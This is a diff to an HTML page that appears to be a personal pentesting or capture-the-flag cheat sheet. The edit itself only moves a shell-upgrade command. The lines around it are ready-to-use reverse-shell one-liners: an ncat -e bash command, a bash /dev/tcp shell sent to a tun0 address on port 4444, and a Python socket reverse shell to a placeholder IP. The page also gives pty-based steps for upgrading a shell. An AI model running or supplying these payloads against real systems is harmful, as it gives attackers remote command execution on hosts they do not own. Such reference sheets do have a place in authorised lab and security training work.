@@ -53,11 +53,11 @@
     <p><span style="font-size: 24px;"><span style="font-family: 'Times New Roman', Times, serif;">ncat -e &quot;/bin/bash -i&quot; IPaddr</span></span></p>
     <p><span style="font-size: 24px;"><strong>upgrade shell</strong></span></p>
     <p><span style="font-size: 24px;">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</span></p>
+    <p><span style="font-size: 24px;">SHELL=/bin/bash script -q /dev/null</span></p>	
     <p><span style="font-size: 24px;"><strong>Reverse Shell</strong></span></p>
     <p><span style="font-size: 24px;">bash -c "bash -i >& /dev/tcp/(tun0 ip add)/4444 0>&1" - Useful if you find a .sh file on remote system</span></p>
     <p><span style="font-size: 24px;"><strong>Python Reverse Shell</strong></span></p>
     <p><span style="font-size: 24px;">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></p>
-    <p><span style="font-size: 24px;">SHELL=/bin/bash script -q /dev/null</span></p>
     <p><span style="font-size: 24px;"><strong><u>Useful site for upgrading shells:</u></strong></span></p>
     <p><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys"><span style="font-size: 24px;">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys</span></a></p>
         <p><br></p>
